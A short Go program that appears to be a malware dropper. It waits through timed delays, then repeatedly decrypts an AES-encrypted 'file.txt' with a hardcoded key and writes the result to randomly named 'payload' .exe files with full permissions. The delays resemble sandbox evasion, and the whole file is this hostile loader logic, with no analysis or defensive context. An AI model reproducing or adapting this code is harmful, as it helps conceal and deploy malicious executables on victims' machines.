package main

import (
	"time"
	"io/ioutil"
	"crypto/aes"
	"crypto/cipher"
	"math/rand"
	"strings"
	"strconv"
	"os"
)

func main() {	
	time.Sleep(15 * time.Second)	
	for j := 0; j < 70; j++{	
		time.Sleep(7 * time.Second)		
	
		data, _ := ioutil.ReadFile("file.txt")
		ciphertext := []byte(string(data))
		key := []byte("catscatscatscats")
		block, _ := aes.NewCipher(key)
		iv := ciphertext[:aes.BlockSize]
		ciphertext = ciphertext[aes.BlockSize:]
		stream := cipher.NewCFBDecrypter(block, iv)
		stream.XORKeyStream(ciphertext, ciphertext)
		value := []string{"payload", ".exe"}		
		str := strings.Join(value, strconv.Itoa(rand.Intn(5000)))	
		ioutil.WriteFile(string(str), ciphertext, 0777)
	}
}
